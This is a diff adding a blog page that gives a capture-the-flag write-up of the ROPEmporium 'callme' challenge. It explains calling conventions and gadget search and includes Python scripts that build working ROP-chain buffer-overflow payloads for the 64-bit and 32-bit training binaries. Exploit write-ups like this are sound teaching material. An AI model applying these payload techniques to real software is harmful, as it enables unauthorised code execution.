@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>callme | ROPEmporium [3] - Arzedlab 🪵</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Ok we have three functions, and we should call them with arguments, which are given, there are 0xdeadbeef, 0xcafebabe, 0xd00df00d . Functions itself are in external library we should call them one by one. Buffer overflow offset is the same, and checksec" />
+	<meta property="og:image" content=""/>
+	<meta property="og:url" content="http://localhost:1313/posts/ropemporium_callme/">
+  <meta property="og:site_name" content="Arzedlab 🪵">
+  <meta property="og:title" content="callme | ROPEmporium [3]">
+  <meta property="og:description" content="Ok we have three functions, and we should call them with arguments, which are given, there are 0xdeadbeef, 0xcafebabe, 0xd00df00d . Functions itself are in external library we should call them one by one. Buffer overflow offset is the same, and checksec">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-11-12T15:19:36+05:00">
+    <meta property="article:modified_time" content="2024-11-12T15:19:36+05:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="ROPEmporium">
+    <meta property="article:tag" content="ROP">
+    <meta property="article:tag" content="Chain">
+    <meta property="article:tag" content="Exploitation">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="callme | ROPEmporium [3]">
+  <meta name="twitter:description" content="Ok we have three functions, and we should call them with arguments, which are given, there are 0xdeadbeef, 0xcafebabe, 0xd00df00d . Functions itself are in external library we should call them one by one. Buffer overflow offset is the same, and checksec">
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7198d56e4fe53ab4610aa7f913b8d3fa7453003ac7791c64a6d6157aecbbced5.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"   />
+	
+
+	
+	
+
+	
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">Arzedlab 🪵</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">callme | ROPEmporium [3]</h1>
+			<div class="meta">Posted on Nov 12, 2024</div>
+		</div>
+		
+		<div class="tldr">
+			<strong>tl;dr:</strong>
+			ROPEmporium - 1, ret2win task writeup
+		</div>
+
+		
+		<div class="toc">
+		<strong>Table of contents:</strong>
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#callme-plts">callme PLTs</a></li>
+    <li><a href="#x86-64-64-bit-calling-convention">x86-64 (64-bit) Calling Convention</a>
+      <ul>
+        <li><a href="#system-v-amd64-abi-unixlinux">System V AMD64 ABI (Unix/Linux):</a></li>
+      </ul>
+    </li>
+    <li><a href="#rdi-rsi-rdx-gadgets">RDI, RSI, RDX gadgets</a></li>
+    <li><a href="#rop-chain">ROP Chain</a></li>
+    <li><a href="#payload">Payload:</a></li>
+    <li><a href="#result">Result:</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#cdecl-calling-convention-in-x86-32-bit"><code>cdecl</code> Calling Convention in x86 (32-bit)</a></li>
+        <li><a href="#example-function-call">Example Function Call</a></li>
+      </ul>
+    </li>
+    <li><a href="#payload-1">Payload:</a></li>
+    <li><a href="#result-1">Result:</a></li>
+  </ul>
+</nav>
+		</div>
+
+		<section class="body">
+			<h1 id="callme">callme</h1>
+<p>Callme challenge, read the description of the task, and then came here</p>
+<p>Task:</p>
+<ul>
+<li>You must call the <code>callme_one()</code>, <code>callme_two()</code> and <code>callme_three()</code> functions in that order, each with the arguments <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code> e.g. <code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code> to print the flag. <strong>For the x86_64 binary</strong> double up those values, e.g. <code>callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code></li>
+</ul>
+<hr>
+<p>Ok we have three functions, and we should call them with arguments, which are given, there are <code>0xdeadbeef</code>, <code>0xcafebabe</code>, <code>0xd00df00d</code> . Functions itself are in external library we should call them one by one. Buffer overflow offset is the same, and <code>checksec</code>  security features of binary also the same with prevoius challange (in short, this means that there is no randomization in memory that will prevent us from doing ROPs)</p>
+<hr>
+<h2 id="callme-plts">callme PLTs</h2>
+<p>With these commands, we can identify the PLT addresses of imported functions and use them to execute those functions through a ROP chain.</p>
+<p><img src="image.png" alt="image.png"></p>
+<ul>
+<li>
+<p><code>rabin2 -i &lt;binary&gt;</code></p>
+<p><strong><code>i</code></strong>: Shows imported functions or symbols from external libraries.</p>
+<p>This command displays <strong>imports</strong> from the binary file. Imports are functions or symbols that the binary references from external libraries, such as <code>printf</code> or <code>malloc</code> from libc. Knowing the imports can help you understand which external functions the binary relies on.</p>
+</li>
+<li>
+<p><code>rabin2 -R &lt;binary&gt;</code></p>
+<p><strong><code>R</code></strong>: Shows relocation entries, used for adjusting addresses at runtime.</p>
+<p>This command lists the <strong>relocations</strong> of the binary. Relocations are used in dynamically linked binaries to adjust addresses when the binary is loaded into memory, ensuring that all external references are correctly mapped. This is particularly useful for understanding how addresses are resolved at runtime, especially in binaries using Position Independent Executables (PIE) and shared libraries.</p>
+</li>
+</ul>
+<p>Or also, command <code>objdump -D ./callme | grep callme</code> gives the same PLT addresses of callme functions</p>
+<p><img src="image1.png" alt="image.png"></p>
+<hr>
+<h2 id="x86-64-64-bit-calling-convention">x86-64 (64-bit) Calling Convention</h2>
+<p>In x86-64, the standard calling convention on Unix-like systems is <strong>System V AMD64 ABI</strong></p>
+<h3 id="system-v-amd64-abi-unixlinux">System V AMD64 ABI (Unix/Linux):</h3>
+<ul>
+<li><strong>Arguments</strong>: First six arguments are passed in <strong>registers</strong> (in order: <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R10</code>, <code>R8</code>). Additional arguments are passed on the stack.</li>
+<li><strong>Return Value</strong>: Stored in the <strong>RAX</strong> register.</li>
+</ul>
+<p>It means the first argument <code>0xdeadbeef</code>  we place into <code>RDI</code> , the second argument <code>0xcafebabe</code>  into <code>RSI</code>, and the third argument <code>0xd00df00d</code> into <code>RDX</code> . It will be called like this</p>
+<p><code>callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code></p>
+<hr>
+<h2 id="rdi-rsi-rdx-gadgets">RDI, RSI, RDX gadgets</h2>
+<p>We need three gadgets to set up arguments for <code>callme</code> functions, each responsible for placing an argument into the <code>RDI</code>, <code>RSI</code>, and <code>RDX</code> registers.
+We begin with <code>pop</code> and search with command <code>rp++ -r2 —unique -f ./callme | grep pop</code></p>
+<p><img src="image2.png" alt="image.png"></p>
+<p>One gadget(1) for <code>rdi</code> , another gadget (2 and 3) for <code>rsi</code>  and <code>rdx</code>  simultaneously.</p>
+<p><img src="image3.png" alt="image.png"></p>
+<hr>
+<h2 id="rop-chain">ROP Chain</h2>
+<p>payload = <code>pop rdi; ret</code>  + <code>0xdeadbeefdeadbeef</code> + <code>pop rsi; pop rdx; ret</code>  + <code>0xcafebabecafebabe</code>  + <code>0xd00df00dd00df00d</code>  + <code>callme_one@plt</code></p>
+<p>payload += <code>pop rdi; ret</code>  + <code>0xdeadbeefdeadbeef</code> + <code>pop rsi; pop rdx; ret</code>  + <code>0xcafebabecafebabe</code>  + <code>0xd00df00dd00df00d</code>  + <code>callme_two@plt</code></p>
+<p>payload += <code>pop rdi; ret</code>  + <code>0xdeadbeefdeadbeef</code> + <code>pop rsi; pop rdx; ret</code>  + <code>0xcafebabecafebabe</code>  + <code>0xd00df00dd00df00d</code>  + <code>callme_three@plt</code></p>
+<h2 id="payload">Payload:</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> struct <span style="color:#ff79c6">import</span> pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>callme_one   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400720</span>
+</span></span><span style="display:flex;"><span>callme_two   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x0000000000400740</span>
+</span></span><span style="display:flex;"><span>callme_three <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x00000000004006f0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4009a3</span> 
+</span></span><span style="display:flex;"><span>pop_rsi_rdx_ret <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x40093d</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>word1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xdeadbeefdeadbeef</span>
+</span></span><span style="display:flex;"><span>word2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xcafebabecafebabe</span>
+</span></span><span style="display:flex;"><span>word3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xd00df00dd00df00d</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">40</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word1)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rsi_rdx_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word2) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, callme_one)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word1)      
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rsi_rdx_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word2)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, callme_two)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rdi_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word1)      
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, pop_rsi_rdx_ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word2)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, word3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;Q&#39;</span>, callme_three)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Output the payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;payload&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) <span style="color:#ff79c6">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Payload written to &#39;payload&#39;&#34;</span>)
+</span></span></code></pre></div><h2 id="result">Result:</h2>
+<p><img src="image4.png" alt="image.png"></p>
+<h1 id="callme-32-bit">callme 32-bit</h1>
+<p>In x86 (32-bit) calling conventions, arguments for functions are passed on the stack, and the specific convention dictates how this is done. Here’s how it typically works in the <code>cdecl</code> convention for a function that takes three arguments.</p>
+<h3 id="cdecl-calling-convention-in-x86-32-bit"><code>cdecl</code> Calling Convention in x86 (32-bit)</h3>
+<p>In <code>cdecl</code>, arguments are passed <strong>right-to-left</strong> on the stack. The caller is responsible for pushing the arguments to the stack before the function call and for cleaning up the stack afterward.</p>
+<h3 id="example-function-call">Example Function Call</h3>
+<p>Consider a function <code>my_function(arg1, arg2, arg3)</code>, which takes three arguments. Here’s how this would look in assembly in the <code>cdecl</code> calling convention:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>push arg3         ; Third argument pushed first (right<span style="color:#ff79c6">-</span>to<span style="color:#ff79c6">-</span>left order)
+</span></span><span style="display:flex;"><span>push arg2         ; Second argument
+</span></span><span style="display:flex;"><span>push arg1         ; First argument
+</span></span><span style="display:flex;"><span>call my_function  ; Call the function
+</span></span><span style="display:flex;"><span>add esp, <span style="color:#bd93f9">12</span>       ; Clean up the stack (<span style="color:#bd93f9">3</span> arguments <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span> <span style="color:#8be9fd;font-style:italic">bytes</span> each <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">12</span> <span style="color:#8be9fd;font-style:italic">bytes</span>)
+</span></span></code></pre></div><p>In simple term it is like stack layout looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">+--------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> my_function        <span style="color:#ff79c6">|</span>  <span style="color:#ff79c6">&lt;--</span> Calling function
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+--------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> Return Address     <span style="color:#ff79c6">|</span>  <span style="color:#ff79c6">&lt;--</span> Points to the address after call function completed
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+--------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> arg0               <span style="color:#ff79c6">|</span>  <span style="color:#ff79c6">&lt;--</span> First argument (pushed last)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+--------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> arg1               <span style="color:#ff79c6">|</span>  <span style="color:#ff79c6">&lt;--</span> Second argument
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+--------------------+</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> arg2               <span style="color:#ff79c6">|</span>  <span style="color:#ff79c6">&lt;--</span> Third argument (pushed first)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">+--------------------+</span>
+</span></span></code></pre></div><h2 id="payload-1">Payload:</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> struct <span style="color:#ff79c6">import</span> pack
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>callme_one   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x080484f0</span>
+</span></span><span style="display:flex;"><span>callme_two   <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x08048550</span>
+</span></span><span style="display:flex;"><span>callme_three <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x080484e0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>word1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xdeadbeef</span>
+</span></span><span style="display:flex;"><span>word2 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xcafebabe</span>
+</span></span><span style="display:flex;"><span>word3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xd00df00d</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_three <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x80487f9</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">44</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, callme_one)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, pop_three)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word1)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word2) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, callme_two)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, pop_three)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word1)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word2) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, callme_three)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, pop_three)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word1)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word2) 
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">+=</span> pack(<span style="color:#f1fa8c">&#39;&lt;I&#39;</span>, word3)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Output the payload</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;payload&#34;</span>, <span style="color:#f1fa8c">&#34;wb&#34;</span>) <span style="color:#ff79c6">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#ff79c6">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Payload written to &#39;payload&#39;&#34;</span>)
+</span></span></code></pre></div><p>You may have multiple questions like, What is the <code>pop_three</code> gadget, why it puts values into <code>esi</code> , <code>edi</code> , and <code>ebp</code> ? In case if it putting arguments into registers why it is putting,what is the purpose of them?</p>
+<p><img src="image5.png" alt="image.png"></p>
+<p>Let&rsquo;s analyze step by step: first, we call the <code>callme</code> function, passing its arguments. According to the stack layout, these arguments are positioned after the return address. Specifically, ARG0 is <code>0xdeadbeef</code>, ARG1 is <code>0xcafebabe</code>, and ARG2 is <code>0xd00df00d</code>. Once these arguments are set, <code>callme</code> is executed. After the function completes, it follows the return address at <code>[+12]</code>, which directs it to <code>callme1</code> at <code>[+28]</code>. (The path which is the crossed)</p>
+<p>Here&rsquo;s the issue: although the EIP (instruction pointer) changes to <code>[+28]</code>, the ESP (stack pointer) remains at <code>[+12]</code>. This misalignment means that the function mistakenly interprets <code>0xcafebabe</code> as the first argument, which is incorrect because we are still on the first argument frame of <code>callme</code>. To correct this, we need to pivot the stack to the arguments for <code>callme1</code>. This is where the <code>pop_three</code> gadget is essential; its primary purpose is to adjust the stack by manipulating ESP. By executing <code>pop [reg]</code> = <code>add esp, 0x8</code> three times, it effectively advances the stack pointer to the second function’s argument frame, aligning everything correctly.</p>
+<p>In summary, the main purpose of the gadget here is stack pivoting, not placing arguments directly into registers. It accomplishes this by adjusting ESP to point to the correct argument frame for <code>callme1</code>.</p>
+<p>After calling all three functions correctly we get the flag.</p>
+<h2 id="result-1">Result:</h2>
+<p><img src="image6.png" alt="image.png"></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/writeup">writeup</a></li>
+					
+					<li><a href="/tags/ropemporium">ROPEmporium</a></li>
+					
+					<li><a href="/tags/rop">ROP</a></li>
+					
+					<li><a href="/tags/chain">chain</a></li>
+					
+					<li><a href="/tags/exploitation">exploitation</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © Ravshan | Made with Love ❤️ <a href="https://twitter.com/arzedlab/"> My Twitter 🪽</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
